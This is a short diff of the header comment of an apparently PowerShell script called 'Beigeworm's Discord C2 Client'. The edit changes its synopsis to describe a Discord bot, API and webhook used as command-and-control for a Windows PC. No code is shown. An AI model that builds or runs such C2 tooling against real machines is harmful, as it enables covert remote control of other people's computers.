@@ -1,7 +1,7 @@
 <# ============================================= Beigeworm's Discord C2 Client ========================================================
 
 **SYNOPSIS**
-Using a Discord Server Chat and a hosted text file to Act as a Command and Control Platform.
+Using a Discord bot along with discords API and a webhook to Act as a Command and Control Platform.
 
 INFORMATION
 This script uses a discord bot along with discords API and a webhook to create a chat that can control a windows pc.
